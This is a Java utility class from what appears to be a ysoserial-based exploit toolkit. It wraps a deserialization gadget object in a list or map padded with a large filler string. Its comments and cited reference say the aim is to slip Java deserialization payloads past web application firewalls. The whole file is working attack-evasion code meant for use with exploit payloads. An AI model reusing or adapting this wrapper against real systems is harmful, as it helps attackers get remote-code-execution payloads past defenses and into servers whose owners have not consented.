package yso.payloads.util;

//import com.cdg.yso.payloads.CommonsCollections6;

//import java.io.FileOutputStream;
//import java.io.ObjectOutputStream;
import java.util.*;

/**
 * @author c0ny1
 * @reference:
 *      Java反序列化数据绕WAF之加大量脏数据
 *      https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/
 */
public class DirtyDataWrapper {
    private int dirtyDataSize; //脏数据大小
    private String dirtyData; //脏数据内容
    private Object gadget; // ysoserila gadget对象

    public DirtyDataWrapper(Object gadget, int dirtyDataSize){
        this.gadget = gadget;
        this.dirtyDataSize = dirtyDataSize;
    }

    /**
     * 将脏数据和gadget对象存到集合对象中
     * @return 一个包裹脏数据和gadget对象可序列化对象
     */
    public Object doWrap(){
        Object wrapper = null;
        dirtyData = getLongString(dirtyDataSize);
        int type = (int)(Math.random() * 10) % 10 + 1;
        switch (type){
            case 0:
                List<Object> arrayList = new ArrayList<Object>();
                arrayList.add(dirtyData);
                arrayList.add(gadget);
                wrapper = arrayList;
                break;
            case 1:
                List<Object> linkedList = new LinkedList<Object>();
                linkedList.add(dirtyData);
                linkedList.add(gadget);
                wrapper = linkedList;
                break;
            case 2:
                HashMap<String,Object> map = new HashMap<String, Object>();
                map.put("a",dirtyData);
                map.put("b",gadget);
                wrapper = map;
                break;
            case 3:
                LinkedHashMap<String,Object> linkedHashMap = new LinkedHashMap<String,Object>();
                linkedHashMap.put("a",dirtyData);
                linkedHashMap.put("b",gadget);
                wrapper = linkedHashMap;
                break;
            default:
            case 4:
                TreeMap<String,Object> treeMap = new TreeMap<String, Object>();
                treeMap.put("a",dirtyData);
                treeMap.put("b",gadget);
                wrapper = treeMap;
                break;
        }
        return wrapper;
    }

    /**
     * 生产随机字符串
     * @param length 随机字符串长度
     * @return 随机字符串
     */
    public static String getLongString(int length){
        String str = "";
        for (int i=0;i<length;i++){
            str += "x";
        }
        return str;
    }
}
